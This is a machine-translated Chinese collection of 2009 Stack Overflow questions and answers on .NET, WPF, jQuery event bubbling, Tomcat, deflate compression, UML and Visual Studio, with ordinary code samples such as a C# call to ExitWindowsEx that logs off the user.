> 时间：2009-01-27T17:09:30.387
> 
> 标签：.net, wpf, silverlight, gridview, visual-studio-2010

我还没有机会看VS2010。是否有用于 WPF 或 Silverlight 的内置 Microsoft Grid？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-01-27T17:17:59.590

[WPF 工具包 - 2008 年 10 月版本](http://www.codeplex.com/wpf/Release/ProjectReleases.aspx?ReleaseId=15598)已经提供了 WPF 网格，并且将包含在 VS 2010 或它的某些版本中。

早在 10 月就发布了[Silverlight Grid](http://blogs.msdn.com/scmorris/archive/2008/10/14/silverlight-2-datagrid-is-released.aspx)。有一些链接等可以让它出现在 Expression Blend 中。人们不得不假设它也将包含在新的 IDE 中。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-27T17:25:57.747

Silverlight 2 中有一个 Grid 控件

[MSDN 中的网格控制文档](http://msdn.microsoft.com/en-us/library/system.windows.controls.grid(VS.95).aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-28T16:18:12.377

请记住，当前的 Visual Studio 2010 版本是 CTP（或社区技术预览版）。许多功能还没有像新的 WPF shell 那样。事实上，运行它的唯一方法是通过 VPC 映像。请留意测试版以获得更好的感觉，但要回答您的问题，是的，网格应该是核心包的一部分。正如其他人指出的那样，WPF 和 Silverlight 工具包今天有版本，您也可以获得源代码。

# javascript - 如何在jQuery中只选择背景

> ID：484270
> 
> 赞同：2
> 
> 时间：2009-01-27T17:09:43.693
> 
> 标签：javascript, jquery

我想在我的项目中添加两个事件。

文件的“背景”之一：`$(document).click(function() {do()});`

一个用于文档中的 div：`$("div").click(function() {do2()});`

问题是当我点击 a 时`div`，两个函数`do`都`do2`被调用。

因此，我如何才能告诉`do()`只有当我没有单击任何元素时才调用？

谢谢你的帮助，

J。

* * *

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-01-27T18:14:37.680

您在此处查找的术语是事件传播或事件冒泡。

“现代”浏览器（这是大多数库挂钩的模型）中的事件处理通过冒泡文档树来工作。这意味着如果你有这样的 html 文档结构

```
<body>
    <div>
        <ul>
            <li>Foo</li>
            <li>Bar</li>
            <li>Baz</li>
        </ul>
    </div>
</body> 
```

有人点击 Foo，会发生以下事件

1.  <li> 接收点击事件
2.  <ul> 接收点击事件
3.  <div> 接收点击事件
4.  <body> 接收点击事件

这就是发生在你身上的事情。您可以做两件事来防止这种情况发生。

首先，正如许多人所建议的那样，如果您的事件处理程序返回 false，那么事件传播将在已单击的元素处停止。（这是 jQuery 处理它的方式，每个库都有不同的方法）

```
$(document).ready(function() {  
    //hookup events for entire body of document
    $('body').bind('click', function(e){
        //do clicked body stuff
    });
    //hookup our divs, returning false to prevent bubbling
    $('div').bind('click', function(e){
        //do clicked div stuff
        return false;  //stop event propagation
    });     
}); 
```

第二个，有些人会认为更好，方法是使用事件委托。在 Javascript 和 DOM 的上下文中，事件委托是将单个事件处理程序附加到外部元素（在本例中为主体），然后根据最初单击的元素执行特定操作。

像这样的东西。

```
$(document).ready(function() {  
        //event delegate
        $('body').bind('click', function(e){
                var originalElement = e.srcElement;
                if(!originalElement){originalElement=e.originalTarget;} 
                if ($(originalElement).is('div')) {
                    console.log("A div!");
                }
                else if ($(originalElement).is('div#inside')) {
                    console.log("A Specific Div!");
                }
                else{
                    console.log("Something else!");
                }                   
        });
}); 
```

这样做的好处是双重的。首先，您可以将所有事件处理代码集中到代码中的一个位置。第二个（在我看来更重要）是附加单个事件处理程序消耗更少的浏览器内存，并为您提供更好的性能前进。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-27T17:31:31.417

诀窍是从事件处理程序返回 false。这将阻止事件进一步传播。

这似乎对我有用：

```
<html><head>
<script type="text/javascript" src="http://jqueryjs.googlecode.com/files/jquery-1.2.6.min.js"></script>
<script type="text/javascript"><!--
$(document).ready(function() {
    $(document).click(function() {
        alert('document'); return false;
    });
    $('#my_div').click(function() {
        alert('div'); return false;
    });
});
--></script>
<body>
<h1>hello!</h1>
<div id="my_div">this div is special</div>
</body></html> 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-01-27T18:01:31.450

你必须调用 stopPropagation()。Andyk 和 Stans 的例子在 Firefox 中对我来说都失败了。

在这里，我在 Firefox 中对此进行了测试，并且可以正常工作。

```
$("html").click(function(event){
    event.stopPropagation();
    alert('document');
});

$("div").click(function(event){
    event.stopPropagation();
    alert('div');
}); 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2009-01-27T17:23:34.180

`div`您可以尝试从文档选择器中排除s 。

```
$(document:not(div)).click(function() {do()});

$("div").click(function() {do2()}); 
```

未经测试。

编辑：意识到我的回答确实是错误的。我将把它放在这里以显示做这件事的错误方法。对于正确的答案，请寻找赞成的答案。

# tomcat - Tomcat 取消部署不会删除 Web 应用程序工件

> ID：484271
> 
> 赞同：16
> 
> 时间：2009-01-27T17:09:50.743
> 
> 标签：tomcat

使用 Manager 取消部署应用程序时，如何让 Tomcat 删除 Web 应用程序工件？

我正在使用 Tomcat 6.0.18。该应用程序是使用 tomcat-maven-plugin 1.0-SNAPSHOT 部署的，但通过 maven 插件或 Web 界面的行为是相同的。

[Tomcat 文档在Manager How To](http://tomcat.apache.org/tomcat-6.0-doc/manager-howto.html#Undeploy%20an%20Existing%20Application)上提供了有关取消部署应如何表现的警告 。

可以删除war文件；但是，解压后的应用程序目录仍然阻止重新部署。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2009-04-16T00:58:09.647

如果您通过应用程序中的 URL 访问 JAR 库中的资源，也可能是文件锁定问题（尤其是在 Windows 上）。

我刚刚遇到了类似的问题，并通过修改以下行来修复它

> Apache Tomcat/conf/context.xml

文件到：

```
<Context antiJARLocking="true" antiResourceLocking="true" > 
```

（请注意，关于这是否是生产安全存在一些争论，因为它会为每次重新部署创建您的 web 应用程序的副本，但如果您在 Windows 上并且无法从源头解决问题，那么这可能会提供一个可行的解决方案）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-02T19:47:15.643

您的应用程序可能无法完全取消部署，因为有后台线程（您很可能是您自己启动的）或长时间运行的请求阻止了应用程序完全停止。

你检查过日志文件吗？他们是否说明应用程序是否可以成功取消部署？还是相反？在您尝试取消部署（在 Unix 上杀死 -3 processid，在 Windows 的控制台中按 Ctrl-Break）并查看是否还有不应该运行的东西后，您能否获得一个线程转储？

另请注意，我见过的大多数应用程序就其占用的内存而言无法完全取消部署。我经常遇到 OutOfMemoryErrors (PermGen)，尤其是在重新部署 webapps 之后（如果你用谷歌搜索，你会在 PermGen 上找到很多参考资料），因此我相信重新部署对于开发机器来说是可以的，但对于生产机器来说是不行的。在生产中对此感到困惑之前，最好先了解这一点。

# .net - 将 WPF 应用程序分发给旧用户群：无缝程度如何？

> ID：484272
> 
> 赞同：2
> 
> 时间：2009-01-27T17:09:52.070
> 
> 标签：.net, wpf, windows, .net-3.5, windows-xp

我正在考虑开发一个 WPF 应用程序，由旧版 Windows 应用程序 (C++) 托管，并且鉴于我拥有广泛的用户群，我正试图更好地了解这样做的可行性瞄准。知道 WPF 以 .NET 3.5 为目标，我正在寻找有关该字段现在是什么样子的一些见解——谁已经拥有运行时，它是否由 Windows 更新分发，如果是，如何（例如，作为可选或必需下载，到哪个操作系统等），XP pre-XP2 是否支持（以及如何）等等。当前版本有成千上万的用户，使用各种 Windows 操作系统，虽然我非常想利用 WPF 为他们的用户体验注入活力，但我想确保我不会将任何人拒之门外这样做，

我意识到这些信息的大部分或全部已经存在于不同的地方，但我想我先在这里问一下，因为我相信你们中的一些人可能已经走上了这条路并且有宝贵的经验可以分享. 提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T17:18:37.247

这个问题有许多不同的方面，但需要注意的一个重要事实是 .Net 3.5 SP1 支持新的[客户端配置文件](http://msdn.microsoft.com/en-us/library/cc656912.aspx)技术，该技术可以根据目标 PC 已经安装的内容进行更小和更精简的部署。我可以根据经验告诉你，如果没有这个，部署 WPF 应用程序可能是一场噩梦，而且安装确实需要很长时间。

是的，WPF 至少需要 XP SP2。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2011-01-06T09:51:23.000

以下是来自我们的 WPF 应用程序的一些[使用统计数据](http://www.nemo-docs.com/blog/?p=125)，您可能会感兴趣。总而言之，对于需要 .NET 3.5 的用户来说，我们没有任何问题，并且几乎 24% 的用户已经在运行 .NET 4 版本。

# c# - 在 C# 中以编程方式从 Win XP 注销用户

> ID：484278
> 
> 赞同：25
> 
> 时间：2009-01-27T17:10:45.313
> 
> 标签：c#, .net, windows, logoff

如何从 C# 应用程序启动 Windows XP 用户注销？我的应用程序的操作应该会产生与在 XP 开始菜单中单击“注销”相同的结果——如果系统要求确认就可以了。

是否有 .Net 或非托管 API 呢？

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2009-01-27T17:16:05.147

您可以 P/Invoke ExitWindowsEx：

> [http://www.pinvoke.net/default.aspx/user32/ExitWindowsEx.html](http://www.pinvoke.net/default.aspx/user32/ExitWindowsEx.html)

把它们放在一起：

```
using System.Runtime.InteropServices;
class Class1
{
    [DllImport("user32.dll")]
    static extern bool ExitWindowsEx(uint uFlags, uint dwReason);

    [STAThread]
    static void Main(string[] args)
    {
        ExitWindowsEx(ExitWindows.LogOff, ShutdownReason.MajorOther | ShutdownReason.MinorOther); 
    }
}

[Flags]
public enum ExitWindows : uint
{
   // ONE of the following five:
   LogOff = 0x00,
   ShutDown = 0x01,
   Reboot = 0x02,
   PowerOff = 0x08,
   RestartApps = 0x40,
   // plus AT MOST ONE of the following two:
   Force = 0x04,
   ForceIfHung = 0x10,
}

[Flags]
enum ShutdownReason : uint
{
    MajorApplication = 0x00040000,
    MajorHardware = 0x00010000,
    MajorLegacyApi = 0x00070000,
    MajorOperatingSystem = 0x00020000,
    MajorOther = 0x00000000,
    MajorPower = 0x00060000,
    MajorSoftware = 0x00030000,
    MajorSystem = 0x00050000,

    MinorBlueScreen = 0x0000000F,
    MinorCordUnplugged = 0x0000000b,
    MinorDisk = 0x00000007,
    MinorEnvironment = 0x0000000c,
    MinorHardwareDriver = 0x0000000d,
    MinorHotfix = 0x00000011,
    MinorHung = 0x00000005,
    MinorInstallation = 0x00000002,
    MinorMaintenance = 0x00000001,
    MinorMMC = 0x00000019,
    MinorNetworkConnectivity = 0x00000014,
    MinorNetworkCard = 0x00000009,
    MinorOther = 0x00000000,
    MinorOtherDriver = 0x0000000e,
    MinorPowerSupply = 0x0000000a,
    MinorProcessor = 0x00000008,
    MinorReconfig = 0x00000004,
    MinorSecurity = 0x00000013,
    MinorSecurityFix = 0x00000012,
    MinorSecurityFixUninstall = 0x00000018,
    MinorServicePack = 0x00000010,
    MinorServicePackUninstall = 0x00000016,
    MinorTermSrv = 0x00000020,
    MinorUnstable = 0x00000006,
    MinorUpgrade = 0x00000003,
    MinorWMI = 0x00000015,

    FlagUserDefined = 0x40000000,
    FlagPlanned = 0x80000000
} 
```

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2009-01-27T17:20:05.030

尝试使用常量“EWX_LOGOFF”或 0 调用“ExitWindowsEx”API 函数。API 指南告诉我第二个参数被忽略。例如，

```
//The import
using System.Runtime.InteropServices;

// The declaration
[DllImport("user32.dll")]
public static extern int ExitWindowsEx(int uFlags, int dwReserved);

// The call
 ExitWindowsEx(0, 0); 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-08-26T18:28:28.447

为了完整起见，我发现最简单的方法是调用 Shutdown.exe（包含在 Windows 中）。

```
Process.Start("shutdown.exe", "-l -t 0"); 
```

这是 Cerebrus 建议的答案，只是 C# 形式。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-01-27T17:29:53.200

塞勒布鲁斯是对的。这里有更多信息： [.Net 中的锁定、注销、重启、关机、休眠、待机](http://www.c-sharpcorner.com/UploadFile/thiagu304/desktopfunctions02112007140806PM/desktopfunctions.aspx)

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-01-27T18:03:05.863

或者你可以打电话：

```
shutdown.exe -l -t 0 
```

如果你想要简单的出路。我自己使用 ExitWindowsEx。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2012-01-19T11:19:49.317

由于某种原因，您无法`-l`与 with结合，`-t`因此这些将不起作用。唯一的方法似乎是前面提到的 P/Invoke。

# asp.net - 如何在代码隐藏中添加链接

> ID：484288
> 
> 赞同：0
> 
> 时间：2009-01-27T17:12:39.473
> 
> 标签：asp.net

我需要根据填充的 DataSet 在代码隐藏中添加链接按钮。我怎么做？我要创建占位符吗？我可以不添加、添加一个或多个不同的链接按钮。我还需要让每个链接的按钮在代码隐藏中调用一个方法。添加按钮时如何连接它？

感谢您的任何帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T17:20:31.377

这是一种方法：

在前端，您将拥有某种类型的数据中继器控件，例如 GridView。

在所述数据绑定控件的 ItemTemplate 中，您将声明您的链接按钮：

```
<asp:linkButton CommandName='Foo' CommandArgument='<%# Eval("Bar") %>'>
<%# Eval("Text") %>
</asp:linkButton> 
```

请注意，我为它分配了一个命令名称，并将一个值绑定到按钮的 CommandArugment 中。这很重要。

然后，在服务器端，为数据中继器的 Click 事件连接一个事件。

检查命令名称和参数的事件参数类，以确定您需要根据单击的链接按钮访问哪个函数。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-27T17:16:52.180

由于您是动态创建的链接按钮，您应该在客户端创建一个面板或占位符，以便您可以将链接附加到面板，以便您知道它们将出现在哪里：

```
 <asp:PlaceHolder ID="Linkholder" Runat="server"></asp:PlaceHolder> 
```

在你的代码后面

```
 Private Sub Page_Load(ByVal sender As System.Object, ByVal e As
   System.EventArgs) Handles MyBase.Load

     For i = 0 To 2 //this is for you iterate how many links you need to add base on your dataset you referred to
       Dim ctrl As New LinkButton
  //and since it is based on the Database you need to give them unique ids if you want to know which one was clicked based on the data info like so
       ctrl.ID = ""+DB.id  //id is suppose to be a "column"field from 
       your database
       ctrl.Text = DB.id+"create"
       ctrl.CommandArgument = "myargument"
       ctrl.CommandName = "mycommandname"
       AddHandler ctrl.Click, AddressOf link_button_click
       Linkholder.Controls.Add(ctrl)
     Next

  End Sub

   Sub link_button_click(ByVal sender As Object, ByVal e As System.EventArgs)
   Dim lb As Linkbutton = CType(sender, LinkButton)

   displayObjects(lb.CommandArgument)­ ­ 
   End Sub 
```

但是，如果不是动态的，您如何在客户端添加链接按钮，但将可见设置为 false，这样您还可以将控件中的属性 onclick 设置为您希望它们使用的方法，并根据发生的情况在您的代码中您想要使链接出现的回发。当这种情况发生时，只需将属性设置为 true：

```
 <asp:linkbutton id="link1" runat="server" onclick="link1method" visible="false"/> 
```

在后面的代码中

```
 public Page_Load(object sender, EventArgs e)
{

   if(//is dataset whatever it is suppose to be for link to show)
   {
       link1.visible=true;
   }

}

public link1method(object sender, EventArgs e)
{

  //for link1 method onclick

} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-27T17:28:30.627

您需要在 RowDataBound 事件中为要绑定的给定 GridView 编写一些代码。在该方法中，您可以使用一些简单的代码动态添加任意数量的控件。此外，您可以利用 CommandName 和 CommandArgument 属性来轻松处理单击操作。

您的 RowDataBound 事件将包含以下代码。

```
If e.Row.RowType = DataControlRowType.DataRow Then

   Dim SpecialLink As New LinkButton()

   SpecialLink.CommandName = "FancyCommand"
   SpecialLink.CommandArgument = e.Row.RowIndex.ToString ''//Or your Unique Data Id too.
   SpecialLink.Text = "Click me to do custom work."
   e.Row.Cells(0).Controls.Add(SpecialLink) ''//Put it in whatever grid cell you'd like

End If 
```

然后，您可以使用 RowCommand 事件轻松地处理您的命令。

```
Private Sub ProcessGridCommand(ByVal sender As Object, ByVal e As System.Web.UI.WebControls.GridViewCommandEventArgs) _
           Handles gvComments.RowCommand

   Select Case e.CommandName

         Case "FancyCommand"

            DoSpecialProcessing(e.CommandArgument)

   End Select

End Sub 
```

我喜欢使用 Select 只是因为它可以很容易地在以后添加更多自定义命令。如果需要，您可以轻松地为 C# 重做此代码。

此外，如果您需要添加超过 1 个链接按钮，您可以在代码中快速完成，而无需使用一堆可能设置为可见或隐藏的占位符链接。

编辑：所以在快速挖掘之后，如果你想调用你的 JavaScript 代码，然后放弃上面的命令名/命令参数，你可以执行以下操作：

```
SpecialLink.Attributes("OnClick") = "lnkDocumentOne_Click();" 
```

您可能需要创建一个“catch all”类型的 JavaScript 方法来处理将调用它的各种链接，或者您也可以使用 Page.RegisterClientScript 方法来注册所有 JavaScript 方法并动态创建它们。

# c# - WPF：带有图标视图的 ListView？

> ID：484293
> 
> 赞同：10
> 
> 时间：2009-01-27T17:13:35.150
> 
> 标签：c#, wpf, listview

我不知道如何在 WPF ListView（类似于 Windows 资源管理器的视图）中实现图标视图。在谷歌上搜索我只找到了关于实现 GridView 的信息，但没有关于图标视图的线索。我不是在谈论`System.Windows.Form.ListView`但是`System.Windows.Controls.ListView`。

也许还有另一个控件可以做到这一点？我没有找到与此相关的任何信息？

我只发现一些人使用列表框手动构建图标视图并更改面板模板和图标模板。我不敢相信这是唯一的方法。

有什么线索吗？

提前致谢

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-01-27T19:57:54.227

**编辑**似乎我误解了您对资源管理器视图的意思...我将我的设置为详细信息...

* * *

WPF 中没有图标视图之类的东西，您必须自己实现它，但您不必从头开始做所有事情。

对于包含图标的列，您可以将 ListView 与 GridView 和至少一个 CellTemplate 结合使用。

对于类似 Windows 资源管理器的视图，一般大纲看起来像这样：

```
<ListView>
    <ListView.Resources>
        <DataTemplate x:Key="IconTemplate">
            <Grid>
                <Grid.ColumnDefinitions>
                    <ColumnDefinition Width="Auto"/>
                    <ColumnDefinition/>
                </Grid.ColumnDefinitions>
                <Image Grid.Column="0"/>
                <TextBlock Grid.Column="1" Text="{Binding Name}"/>
            </Grid>
        </DataTemplate>
    </ListView.Resources>            
    <ListView.View>     
        <GridView>
            <GridViewColumn CellTemplate="{StaticResource IconTemplate}" Header="Name"/>
            <GridViewColumn DisplayMemberBinding="{Binding Size}" Header="Size"/>
            <GridViewColumn DisplayMemberBinding="{Binding Type}" Header="Type"/>                    
        </GridView>
    </ListView.View>
</ListView> 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-01-27T19:54:14.390

就在我的头上，你试过这个吗？

```
<Style TargetType="ListBox">
  <Setter Property="ItemsPanel">
    <Setter.Value>
      <ItemsPanelTemplate>
        <UniformGrid/>
      </ItemsPanelTemplate>
    </Setter.Value>
  </Setter>
</Style> 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-01-27T20:04:15.180

与 Tanveer Badar 的答案相同，但使用 WrapPanel 而不是 UniformGrid。在您的列表框中设置以下内容：

```
ScrollViewer.HorizontalScrollBarVisibility="Disabled" 
ScrollViewer.VerticalScrollBarVisibility="Auto" 
```

强制 WrapPanel 换行。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-08-26T09:18:33.223

[这是该问题的另一种解决方案](https://docs.microsoft.com/en-us/archive/blogs/atc_avalon_team/)

[![替代文字](https://i.stack.imgur.com/pw09v.jpg)](https://i.stack.imgur.com/pw09v.jpg)
[（来源：[msdn.com](http://blogs.msdn.com/photos/atc_avalon_team/images/585779/640x443.aspx)）]

# algorithm - 在 deflate 算法中确定块大小的一些好的策略是什么？

> ID：484295
> 
> 赞同：9
> 
> 时间：2009-01-27T17:13:49.223
> 
> 标签：algorithm, compression, gzip, deflate

我正在编写一个压缩库作为一个小项目，我已经足够远了（我的库可以提取任何标准的 gzip 文件，以及产生兼容的（但肯定不是最佳的）gzip 输出），是时候弄清楚了出一个有意义的块终止策略。目前，我只是在每 32k 输入（LZ77 窗口大小）之后切断块，因为它方便且快速实施——现在我要回去尝试实际提高压缩效率。

[Deflate 规范](http://www.gzip.org/zlib/rfc-deflate.html)对此只有这样的说法：“当压缩器确定用新鲜树开始一个新块会很有用时，或者当块大小填满压缩器的块缓冲区时，压缩器会终止一个块”，这还不是全部那很有帮助。

我对 SharpZipLib 代码进行了排序（因为我认为这将是最易读的开源实现），发现它每输出 16k 文字就终止一个块，而忽略输入。这很容易实现，但似乎必须有一些更有针对性的方法，特别是考虑到规范中的语言“确定用新鲜树开始一个新块将是有用的”。

那么是否有人对新策略或现有策略的示例有任何想法？

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-27T19:15:05.390

作为让你前进的建议。

具有足够大小的缓冲区的推测性展望，表明卓越的压缩是值得改变的。

这会改变流式传输行为（在输出发生之前需要输入更多数据），并使诸如刷新之类的操作显着复杂化。这也是压缩桩的相当大的额外负载。

在一般情况下，可以通过在可以开始新块的每个点进行分支来确保产生最佳输出，并根据需要递归两个分支，直到采用所有路线。具有嵌套行为的路径获胜。这在非平凡的输入大小上不太可能是可行的，因为何时开始新块的选择是如此开放。

简单地将其限制为最少 8K 的输出文字，但防止在一个块中超过 32K 的文字，将为尝试推测算法提供一个相对易于处理的基础。将 8K 称为子块。

其中最简单的是（伪代码）：

```
create empty sub block called definite
create empty sub block called specChange
create empty sub block called specKeep
target = definite
While (incomingData)
{
  compress data into target(s)    
  if (definite.length % SUB_BLOCK_SIZ) == 0)
  {
    if (targets is definite)
    {
      targets becomes 
        specChange assuming new block 
        specKeep assuming same block as definite
    }        
    else
    {
      if (compression specChange - OVERHEAD better than specKeep)
      {
        flush definite as a block.
        definite = specChange
        specKeep,specChange = empty
        // target remains specKeep,specChange as before 
        but update the meta data associated with specChange to be fresh
      }
      else 
      {
        definite += specKeep
        specKeep,specChange = empty
        // again update the block meta data
        if (definite is MAX_BLOCK_SIZE)
        {
          flush definite
          target becomes definite 
        }
      }
    }
  }
}
take best of specChange/specKeep if non empty and append to definite
flush definite. 
```

OVERHEAD 是一个常数，用于解释切换块的成本

这很粗略，可能会得到改进，但如果没有别的，这只是分析的开始。检测代码以获取有关导致切换的原因的信息，使用它来确定更改可能有益的良好启发式方法（也许压缩比已显着下降）。

这可能导致 specChange 的构建仅在启发式认为合理时才进行。如果启发式结果是一个强有力的指标，那么您可以消除投机性质，并决定无论如何都在这一点上进行交换。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-27T19:58:33.837

嗯，我喜欢一些启发式分析的想法，以尝试提出一些“规则”，以便在结束块时可能是有益的。今晚我会研究你建议的方法，看看我能用它做什么。

与此同时，我突然想到，为了在这个问题上做出充分知情的选择，我需要更好地了解块大小决策的利弊。很快我就知道更小的块可以让你有一个潜在的更好的目标符号字母表——代价是更频繁地定义树的开销增加。较大的块以规模效率对抗其更通用的符号字母表（只有一棵树来存储和解码大量编码数据）。

在我的脑海中，文字代码与长度，距离代码的相对分布是否会对最佳块大小产生特定影响尚不清楚。不过值得深思。

# java - UML 类图资源

> ID：484301
> 
> 赞同：3
> 
> 时间：2009-01-27T17:15:06.070
> 
> 标签：java, oop, resources, uml, class-design

有没有人有任何好的资源来提高我开发类图的技能？理想情况下想要 UML 2.0 中的任何强大的教程，但搜索似乎返回的结果很差。

目前也在为最后一年的考试进行修改，真的很想尝试用一个典型的答案来练习试卷，我已经搜索了高低没有任何运气，有没有人碰巧对我可以在哪里找到一些建议?

基本上任何有助于推动我的修订的资源。会喜欢有机会看到更先进的东西并突破界限。

任何帮助表示赞赏。

谢谢，瑞奇

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T17:27:45.077

*   StackOverFlow 的在线 UML 指南（不再可用）
*   [实用 UML：面向开发人员的实践介绍](http://dn.codegear.com/article/31863)
*   统一建模语言 (UML) 教程（不再可用）
*   [UML 教程和介绍](http://www.cragsystems.co.uk/ITMUML/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-27T17:20:00.410

[马丁福勒写了一本书](https://rads.stackoverflow.com/amzn/click/com/0321193687)。最新版本是针对 UML2 发布的...

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-27T17:21:37.350

Sparx Systems 在这里有一个 UML 导师：[http ://www.sparxsystems.com/uml-tutorial.html](http://www.sparxsystems.com/uml-tutorial.html)

他们也有他们工具的试用版，如果你愿意的话……

编辑：请务必检查他们的导航窗格以获取其他资源。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-27T17:34:25.547

我总是在书签中保留一些备忘单以供快速参考。

试试这些：

*   [http://loufranco.com/blog/assets/cheatsheet.pdf](http://loufranco.com/blog/assets/cheatsheet.pdf)
*   [http://www.scribd.com/doc/399157/UML-20-Cheatsheet](http://www.scribd.com/doc/399157/UML-20-Cheatsheet)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-09-06T22:04:58.137

在线 UML 资源集合（不再可用）[UML 备忘单](http://modeling-languages.com/blog/content/top-seven-uml-cheatsheets)
集合

# version-control - 从 ClearCase 迁移到 TFS2008 的最佳工具是什么？

> ID：484315
> 
> 赞同：2
> 
> 时间：2009-01-27T17:18:41.147
> 
> 标签：version-control, tfs, migration, clearcase, tfs-migration

我们正在从 ClearCase 迁移到 TFS2008。我很容易找到了 MS 迁移工具，但它似乎是针对 TFS 2005 的。关于其他可以实现此目的的工具有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-27T22:34:11.027

当您将使用此迁移工具时，请记住：

*   TFS 早期分支和 ClearCase 即时分支[是不同的](http://blogs.msdn.com/tfs_migration/archive/2007/09/13/migrating-clearcase-branches-to-tfs.aspx)，这意味着您需要一个配置规范（在 ClearCase 方面）反映给定分支的文件（即使从技术上讲，所有文件都没有在该分支上创建任何版本）。一个好的方法是确保在一组连贯的文件（您要导入）上存在标签（或更好的基线），标签放置导入的分支。
*   您不应该试图导入*所有文件的所有*ClearCase 版本，而应该只导入带标签的版本，前提是您可以确定该标签已放在给定集合的*所有文件上。*这使用 UCM 更容易，因为根据定义，基线是放在组件的所有文件上的标签。

因此，如果 ClearCase 到 TFS2008 迁移脚本确实采用标签/基线并且能够确定它们与哪个分支/流相关联，那么您就走在了正确的道路上。

# c# - 您将如何禁用 .net Winforms 控件而不改变其外观？

> ID：484326
> 
> 赞同：7
> 
> 时间：2009-01-27T17:20:44.670
> 
> 标签：c#, .net, winforms

假设我有一个控件，我想阻止它被编辑。

将控件的 Enabled 属性设置为 False 将起作用，但控件外观会相应更改，通常为难以阅读的黑灰色字体。当可读性仍然很重要时，这是一个真正的问题。

对于 TextBox，有一些明显的修复：

```
Textbox1.BackColor = Color.White; 
```

或者

```
Textbox1.ReadOnly= true; // instead of setting Enabled to false 
```

但不幸的是，这不适用于每个控件（例如单选按钮）

另一种解决方案是让 Enabled 属性保持不变，并像这样订阅焦点事件（但这不是一个真正优雅的解决方案）

```
 this.Textbox1.Enter += new System.EventHandler(this.Textbox1_Enter);

    private void Textbox1_Enter(object sender, EventArgs e)
    {
      Textbox1.FindForm().ActiveControl = null;
    } 
```

你见过其他处理这个问题的方法吗？（我的意思是现实世界的解决方案；当然，您可以捕获控件的屏幕截图并在控件上显示副本...：p）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-27T17:30:08.207

有一种说法是，干扰标准 Windows 行为会让用户感到困惑，但除此之外，我以前也见过这种做法，尽管在 C++ 中更常见。您可以对控件进行子类化并自己处理绘制消息。当控件启用时，只需将绘图委托给基类。当控件被禁用时，您可以让基类自己绘制，然后在顶部进行一些自定义绘制，或者您可以自己绘制整个东西。我强烈推荐这些选项中的第一个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2010-08-07T13:35:47.120

通常，是的，不想更改 windows 默认行为。

但是我有一个案例，我禁用页面上的许多控件，通常不到一秒钟，以避免多线程应用程序中的一些跨线程问题。当用户滚动时，这会导致主要的闪烁问题，例如树视图或列表框。在这种情况下不改变它们的外观是一件可取的事情。

但是，当控件由于其他原因被禁用时，我希望它们的外观能够反映它们的启用/禁用状态。

启用/禁用状态的闪烁在它只是暂时的事情的情况下实际上会导致对软件的负面看法比抑制禁用控件的外观变化以避免闪烁表单的许多部分更.

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2009-01-27T17:22:41.327

可以将某些控件设置为 ReadOnly，从而使它们处于启用状态，但无法更改。这可能是您正在寻找的。

也就是说，当您的用户开始感到困惑时，您可能会受到伤害，因为看起来他们应该能够编辑控件，但他们不能。他们改变视觉外观是有原因的——将系统状态传达给用户。搞砸了，他们最终可能会很困惑。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2009-01-27T17:45:00.843

如果控件被禁用/只读，那么它确实需要看起来被禁用/只读。否则，您将完全混淆用户。

Windows 控件的行为方式和您确实希望与其他 Windows 界面保持一致是有充分理由的。当有人使用 Windows 应用程序时，他们对它的外观和行为有一定的期望。

如果您偏离这些期望，那么用户通常会认为您的软件是垃圾。

# .net - 如何防止 Visual Studio 重命名我的控件？

> ID：484327
> 
> 赞同：26
> 
> 时间：2009-01-27T17:20:50.363
> 
> 标签：.net, visual-studio

如果我粘贴类似的东西

```
<asp:DropDownList ID="DropDownListExpirationDate" runat="server" /> 
```

到已经具有 ID 控件的 ASPX 文件上`DropDownListExpirationDate`，它将新粘贴的控件重命名为`DropDownList1`.

```
<asp:DropDownList ID="DropDownList1" runat="server" /> 
```

我宁愿没有。我宁愿它只是粘贴我复制的内容。

有没有办法禁用此功能？

* * *

## 回答 #1

> 赞同：57
> 
> 时间：2009-01-27T17:24:51.930

经过快速检查（！）....

工具 > 选项 > 文本编辑器 > HTML > 其他

取消选中“在源视图中粘贴时自动 ID 元素”。

# python - Django模板中的编码问题

> ID：484338
> 
> 赞同：5
> 
> 时间：2009-01-27T17:23:20.933
> 
> 标签：python, django, unicode, internationalization, django-templates

